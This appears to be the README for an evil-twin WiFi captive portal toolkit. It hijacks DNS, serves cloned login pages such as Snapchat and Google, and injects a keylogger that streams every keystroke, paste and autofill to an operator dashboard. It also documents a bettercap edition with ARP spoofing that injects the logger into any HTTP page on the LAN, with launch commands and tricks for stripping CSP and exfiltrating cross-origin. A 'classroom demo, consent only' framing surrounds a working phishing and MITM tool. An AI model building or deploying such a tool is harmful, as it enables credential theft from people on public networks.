# Captive portal with universal live keylogger (classroom demo build)

A fake-WiFi captive portal: `hostapd` (radio) → `dnsmasq` (DHCP + DNS hijack) → `iptables` (block all, open per-MAC after login) → `portal_server.py` (login pages + universal live keystroke logger) → `live_view.py` (teacher live screen) + `spy_view.py` (browser dashboard). Plus a `bettercap` edition for injecting the same logger into arbitrary HTTP pages.

**Lab/classroom demo only — your own network, your own devices, explicit consent. Wipe `run/*.log` after class.**

## What it does

- Broadcasts an open WiFi AP (`hostapd`) with optional WPA password.
- Hijacks DNS so every name resolves to the portal (`dnsmasq`).
- `iptables` chains `CAPTIVE_HTTP` gate traffic until the client clicks Connect; MAC is then authorized.
- Serves a swappable portal theme from `my-portals/<name>/` and injects a universal sensor that streams every keystroke, paste, autofill and submit — live, before submit.
- Live views: `live_view.py` (terminal), `spy_view.py` (browser dashboard on `:8765`), `traffic_view.py` (DNS/HTTP/HTTPS sites per device).
- `bettercap` caplet injects the same logger into any HTTP page on the LAN (MITM).

## Quick start

```bash
sudo ./setup.sh            # once: hostapd dnsmasq iptables python3 iw iproute2 rfkill
sudo ./run.sh              # interactive: iface, mode (isolated/nat), portal, SSID, channel...
sudo ./stop.sh             # stop + flush firewall
```

After reboot, just `sudo ./run.sh` again — nothing auto-starts; `run/last.conf` remembers choices.

- `isolated` = portal only, no internet. `nat` = share internet after Connect.
- Portals live in `my-portals/<name>/` (needs `index.html` with `<form method=POST action=/auth>`).
- New portal: `cp -r my-portals/_template my-portals/mine`, edit it, re-run `./run.sh` and pick `mine` (or press `s` while running).
- Live typing: `run.sh` pops a `foot` window (`live_view.py`) showing each field as clients type. Reopen with `[l]`; manual: `python3 live_view.py --port 80`.
- Spy dashboard: `run.sh` starts `spy_view.py` on `http://127.0.0.1:8765/`. Reopen/restart with `[v]`; manual: `python3 spy_view.py`.
- Traffic view: `python3 traffic_view.py --log run/traffic.log --iface wlan1 --gateway 192.168.5.1`.

## Universal portal logger (v7 sensor)

`portal_server.py` injects `__portal_sensor v7` into every served HTML page:

- Capture-phase `input`/`change`/`keydown`/`paste`/`submit` on `INPUT`/`TEXTAREA`/`SELECT`/contenteditable.
- MutationObserver + shadow-DOM/iframe piercing + 2.5 s autofill sweep.
- Per-keypress batches carrying `clientId`/`sess`/`page`/`title`/`events[{type,value,field,ftype}]`.
- Transport: batched `fetch(keepalive)` + XHR fallback + `sendBeacon` on submit/hide; retry queue with per-client `seq` dedupe.
- `/keys`, `/__portal_keys`, `/beacon` accept single events, batches, legacy `{field,value}`, and `sendBeacon text/plain`; `X-Orig-Host` honored; CORS `*` + `OPTIONS` preflight.
- Append-only `run/keystrokes.jsonl` (`--keys-log`) + in-memory per-IP mirror with 120-event tape.
- Endpoints: `/live` (page/title/active_field/active_ago/tape per client), `/tape?since=&limit=`, `/history`, `/submissions`.
- `inject_sensor()` is idempotent, case-insensitive `</body>`/`</html>`, strips meta-CSP that would block the sensor.

## bettercap edition

`bettercap.js` — same universal logger as a bettercap `jsinject` payload. Exfil uses absolute `LOGGER` URL with `text/plain` + `no-cors` (no preflight, works cross-origin from any site); failed batches re-queued (memory + localStorage); same-origin `/__bc_keys` image beacon on submit so credentials appear in bettercap's own HTTP log even if the logger is down.

```bash
# 1. edit bettercap.js -> set LOGGER to your logger box IP (default http://192.168.4.1)
# 2. start the logger first:
sudo ./run.sh
# 3. run bettercap:
sudo bettercap -iface wlan1 -caplet bettercap.cap
# (uncomment arp.spoof block in bettercap.cap for full MITM on lab targets)
```

Notes: stock `http.proxy` only sees HTTP. HTTPS needs `https.proxy` + lab CA on demo devices. An `https://` page cannot exfiltrate to an `http://` logger (mixed-content block); on submit the payload drops a same-origin `/__bc_keys` beacon as fallback.

## Run.sh controls (while running)

```
[s]witch portal   [l]ive window   [t]raffic   [v]spy dashboard
[r]edirects       [c]lients       [q]uit
```

## Files

```
run.sh             # interactive wizard + live control loop (1231 lines)
setup.sh           # deps + AP capability check
stop.sh            # stop + flush firewall/iptables
portal_server.py   # stdlib HTTP portal + sensor injection + /keys /live /tape /history /submissions /auth /admin
live_view.py       # terminal live typing feed (localhost only)
spy_view.py        # browser keylog dashboard (TailAdmin-style, :8765, localhost only)
traffic_view.py    # DNS/HTTP/HTTPS per device from tcpdump log
preview_spy.py     # preview the spy dashboard with fake data (no root needed)
bettercap.js       # bettercap jsinject payload (same sensor)
bettercap.cap      # bettercap wiring (jsinject + proxy + arp.spoof)
config.yaml        # defaults (SSID, password, channel, iface, mode, portal, gateway, ...)
my-portals/*/      # HTML portal themes (20 built-in + _template)
run/               # runtime: last.conf, authorized_macs, *.log, keystrokes.jsonl
Old/               # earlier build (school-test rig + simpler portal engine)
SUMMARY.md         # build notes + known limits
```

## Requirements

- Linux (Kali/Debian/Ubuntu)
- root / sudo
- WiFi adapter with **AP mode** (`iw list` → `* AP`)
- `hostapd`, `dnsmasq`, `iptables`, `iw`, `ip`, `python3`, `rfkill`
- Optional: `foot` (for `--watch`/live window), `tcpdump` (traffic view), `bettercap` (MITM edition), `dnsutils` (doctor)

## Known limits (say these out loud in class)

- **HTTPS needs a CA + TLS proxy** (deferred to protect mobile data): stock setup sees HTTP only; `https://` pages can't exfiltrate to an `http://` logger (mixed-content block) — the same-origin submit beacon is the fallback.
- Cert-pinned apps (banking/Snapchat) refuse even a lab CA — frame as the lesson, not a bug.
- Heavy clones (`snapchat`, `google_new`) need local/vendor assets or a static fallback form to render fully offline.
- IPv6 can bypass the portal; HSTS-preloaded real sites error pre-auth.
- Wipe `run/*.log` and `run/keystrokes.jsonl` after the demo.

## Security / ethics

- Open AP by design (captive portals can't do WPA).
- Admin is localhost-only (`spy_view.py` binds `127.0.0.1`).
- Lab/classroom demo on your own network and own devices with explicit consent only.
- Never run this on networks or devices you don't own.

## License

MIT (no LICENSE file shipped — treat as all rights reserved unless you add one).
